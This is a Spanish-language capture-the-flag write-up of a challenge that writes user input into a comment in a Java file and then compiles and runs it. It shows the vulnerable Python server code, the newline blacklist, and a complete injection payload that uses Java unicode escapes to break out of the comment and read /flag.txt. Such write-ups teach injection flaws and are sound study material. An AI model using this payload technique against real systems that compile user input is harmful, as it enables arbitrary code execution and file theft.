Revisamos en el codigo:
```python
blacklist = ['\r', '\n']       # <--- Esto nos interesa
if __name__ == "__main__":
    print(r"""+
|        ______  _____  _____  ____    ______  _____   ______   ______  _____  _____   _____
|       |      >/     ||_    ||    |  |   ___||     | |   ___| |   ___|/     \|     | |     |
|       |     < |  /  | |    ||    |_ |   ___||     \  `-.`-.  |   |__ |     ||     \ |    _|_
|       |______>|_____/ |____||______||______||__|\__\|______| |______|\_____/|__|\__\|___| |_|
+
Welcome to b01lersCorp Semantic LOad-balanced Program GENerator (SLOPGEN) v3.20.25.
    """, flush=True)
    comment = input('Enter your prompt below:\n> ')
    # No tricks, please :)
    for banned in blacklist:
        if banned in comment:
            print('Illegal characters: terminating...')
            exit()

    with open('/tmp/Main.java', 'w') as f:
        # Write the prompt into the source file

        f.write(FILE_TEMPLATE % comment)

        # TODO: run the actual model !!!

    print('\nYour program output:\n', flush=True)
    os.system('cd /tmp && javac Main.java && java Main')
    print('===', flush=True)
```

Vemos que le prestan principal importancia a los caracteres especiales del salto de linea, sin embargo podemos introducirlos en formato unicode.

```
\n --> \u000a
\r --> \u000d
```

Vamos a revisar el codigo que ejecutara el servidor:

```java
import java.io.*;

public class Main {
    // %s
    public static void main(String[] args) {
        // TODO: implement me
    }

    public static String getFlag() throws IOException {
        // FIXME: we probably don't want the user accessing this; just throw for now
        throw new RuntimeException("Not implemented yet");

        // var br = new BufferedReader(new FileReader("/flag.txt"));
        // return br.readLine();
    }
}
```

Dado que el compilador de java interpreta los saltos de linea quisieramos que el codigo quedara asi:

```java
import java.io.*;

public class Main {
    // \r\n
    public static void main(String[] args) {
        try{
            System.out.println(getFlag());
        }catch(IOExceptio e){
            System.out.println("Flag not found...");
        }
    }
    public static String getFlag() throws IOException{
        var br = new BufferedReader(new FileReader("/flag.txt"));
        return br.readLine();
    }
}
class Bypass{
    public static void main(String[] args) {
        // TODO: implement me
    }

    public static String getFlag() throws IOException {
        // FIXME: we probably don't want the user accessing this; just throw for now
        throw new RuntimeException("Not implemented yet");

        // var br = new BufferedReader(new FileReader("/flag.txt"));v
        // return br.readLine();
    }
}
```

Esto lo conseguimos enviando la siguiente cadena:

```
\u000d\u000a public static void main(String[] args){try{System.out.println(getFlag());}catch (IOException e){System.out.println("ERROR: Flag not found");}}public static String getFlag() throws IOException{var br = new BufferedReader(new FileReader("/flag.txt"));return br.readLine();} }class BYPASS{
```

Y obtenemos la flag:

```
FLAG: bctf{} 
```

